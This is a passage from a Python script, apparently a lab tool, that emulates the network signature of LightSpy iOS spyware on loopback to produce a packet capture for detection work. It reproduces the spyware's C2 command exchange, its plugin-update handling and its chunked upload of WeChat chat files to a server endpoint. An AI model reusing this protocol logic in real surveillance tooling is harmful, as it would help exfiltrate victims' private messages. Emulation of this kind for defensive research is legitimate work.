            ("chatType", "wechat"),
            ("filepath", VIRTUAL_WECHAT_PATH),
            ("type", "chat_file"),
            ("size", str(len(content))),
            ("hash", file_hash),
        ]
        offset = 0
        while True:
            chunk = content[offset : offset + CHUNK_SIZE]
            if not chunk:
                raise RuntimeError("El servidor solicitó un desplazamiento fuera del fichero")
            response = await https_post(
                "/api/phone_shard_file",
                [*fields, ("offset", str(offset))],
                self.tls_context,
                self.log,
                file_part=("file", VIRTUAL_WECHAT_PATH, chunk, "application/octet-stream"),
            )
            next_offset = int(response["offset"])
            if next_offset == 0:
                break
            offset = next_offset

    async def handle_server_message(self, message: dict[str, Any]) -> None:
        command = int(message.get("cmd", -1))
        if command == 10001:
            remote = message.get("data") or {}
            await self.ws.send_json({"cmd": 10002})
            await self.ws.send_json(PERMISSION_FRAME)
            await self.ws.send_json({"cmd": 10013})
            await self.ws.send_json({"cmd": 10005})
            if remote.get("controlver") != self.control_version:
                await self.ws.send_json({"cmd": 10003})
            if remote.get("planver") != self.plan_version:
                await self.ws.send_json({"cmd": 10004})
        elif command == 10002:
            pass
        elif command == 10003:
            self.control_version = str(message.get("version", self.control_version))
        elif command == 10004:
            self.plan_version = str(message.get("version", self.plan_version))
        elif command == 10005:
            version = str(message.get("version", ""))
            entries = message.get("data") or []
            valid = all(
                all(key in entry for key in ("name", "md5", "ver", "url", "classpath"))
                for entry in entries
            )
            if version != self.plugin_version and entries and valid:
                self.plugin_version = version
                await self.plugin_load(2)
        elif command == 10008:
            for order in message.get("data") or []:
                if int(order.get("cmd", -1)) == 12005:
                    await self.upload_wechat_result()
                    await self.ws.send_json({"cmd": 12005, "data": {}})

    async def run(self) -> None:
        ensure_payloads()
        for name in STAGE_NAMES:
            path = STAGE_PREFIX + name
            await plain_http_get(path, self.log)
            self.downloaded.add(name)

        await self.send_log("进入启动程序,开启启动取证程序!")
        await self.send_log("程序开始初始化!")
        ws_task = asyncio.create_task(self.ws.run(self.handle_server_message))
        await dns_probe(self.log)
        await self.send_log("程序完成初始化工作!")
        plugin_task = asyncio.create_task(self.initial_plugin_thread())
        main_task = asyncio.create_task(self.main_thread())

        await asyncio.gather(plugin_task, main_task, ws_task)
        await self.dispatcher.wait()


async def run_client() -> None:
    ensure_payloads()
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    configured_keylog = os.environ.get("LABNET_TLS_KEYLOG")
    keylog = (
        Path(configured_keylog)
        if configured_keylog
        else LOG_DIR / f"tls-keys-{timestamp()}-{os.getpid()}.log"
    )
    keylog.parent.mkdir(parents=True, exist_ok=True)
    log = EventLog("client")
    context = client_tls_context(keylog)
    scenario = ClientScenario(context, log)
    print("Ejecutando el flujo seleccionado...")
    await scenario.run()
    print("Flujo completado.")
    print(f"Registro local: {log.path}")
    print(f"Claves TLS: {keylog}")


def required_executable(name: str) -> str:
    executable = shutil.which(name)
    if executable:
        return executable
    local = ROOT / name
    if local.is_file() and os.access(local, os.X_OK):
        return str(local)
    raise RuntimeError(f"No se encuentra el ejecutable requerido: {name}")


def loopback_address_state(address: str) -> str:
    result = subprocess.run(
        [required_executable("ip"), "-o", "-4", "addr", "show"],
        check=True,
        capture_output=True,
        text=True,
    )
    for line in result.stdout.splitlines():
        columns = line.split()
        if len(columns) >= 4 and columns[2] == "inet":
            current = columns[3].split("/", 1)[0]
            if current == address:
                return "loopback" if columns[1] == "lo" else "other"
    return "absent"


def configure_historical_addresses() -> list[str]:
    added: list[str] = []
    ip_command = required_executable("ip")
    try:
        for address in (STAGE_IP, C2_IP):
            state = loopback_address_state(address)
            if state == "other":
                raise RuntimeError(
                    f"La dirección {address} ya pertenece a otra interfaz; no se modificará."
                )
            if state == "absent":
                subprocess.run(
                    [ip_command, "addr", "add", f"{address}/32", "dev", "lo"],
                    check=True,
                )
                added.append(address)
    except Exception:
        remove_historical_addresses(added)
        raise
    return added


def remove_historical_addresses(addresses: Iterable[str]) -> None:
    addresses = tuple(addresses)
    if not addresses:
        return
    ip_command = required_executable("ip")
    for address in addresses:
        subprocess.run(
            [ip_command, "addr", "del", f"{address}/32", "dev", "lo"],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )


def stop_process(process: subprocess.Popen[bytes] | None, interrupt: bool) -> None:
    if process is None or process.poll() is not None:
        return
    process.send_signal(signal.SIGINT if interrupt else signal.SIGTERM)
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=5)


async def run_capture() -> None:
    if os.name != "posix" or not hasattr(os, "geteuid") or os.geteuid() != 0:
        raise RuntimeError("El modo capture debe ejecutarse con sudo dentro de WSL.")

    tcpdump_command = required_executable("tcpdump")
    required_executable("openssl")
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)

    run_id = f"{timestamp()}-{os.getpid()}"
    capture_path = CAPTURE_DIR / f"lightspy-ios-{run_id}.pcap"
    tcpdump_log_path = LOG_DIR / f"tcpdump-{run_id}.log"
    tcpdump_log = tcpdump_log_path.open("wb")
    added_addresses: list[str] = []
    tcpdump_process: subprocess.Popen[bytes] | None = None
    stage: asyncio.AbstractServer | None = None
    c2: asyncio.AbstractServer | None = None

    try:
        added_addresses = configure_historical_addresses()
        stage, c2, _, _ = await start_servers()
        capture_filter = (
            f"host {STAGE_IP} or host {C2_IP} or "
            f"(udp port {DNS_PORT} and host {DNS_IP})"
        )
        tcpdump_process = subprocess.Popen(
            [
                tcpdump_command,
                "--immediate-mode",
                "-B",
                "4096",
                "-i",
                "lo",
                "-s",
                "0",
                "-U",
                "-w",
                str(capture_path),
                capture_filter,
            ],
            stdout=tcpdump_log,
            stderr=subprocess.STDOUT,
        )
        await asyncio.sleep(0.4)
        if tcpdump_process.poll() is not None:
            raise RuntimeError(f"tcpdump no arrancó; consulta {tcpdump_log_path}")

        async with stage, c2:
            await run_client()
            # Allow libpcap to drain the final upload, its response and the
            # WebSocket completion/close exchange before interrupting tcpdump.
            await asyncio.sleep(2.0)
    finally:
        if stage is not None:
            stage.close()
            await stage.wait_closed()
        if c2 is not None:
            c2.close()
            await c2.wait_closed()
        stop_process(tcpdump_process, interrupt=True)
        tcpdump_log.close()
        remove_historical_addresses(added_addresses)

    if not capture_path.is_file() or capture_path.stat().st_size == 0:
        raise RuntimeError("La captura no se creó correctamente.")
    digest = hashlib.sha256(capture_path.read_bytes()).hexdigest()
    print(f"PCAP: {capture_path}")
    print(f"SHA-256: {digest}")


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Emulación de la firma de red de LightSpy para iOS"
    )
    parser.add_argument("mode", choices=("serve", "client", "capture"))
    return parser.parse_args()


def main() -> int:
    args = parse_arguments()
    try:
        if args.mode == "serve":
            asyncio.run(run_servers())
        elif args.mode == "client":
            asyncio.run(run_client())
        else:
            asyncio.run(run_capture())
    except KeyboardInterrupt:
        return 130
    except Exception as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
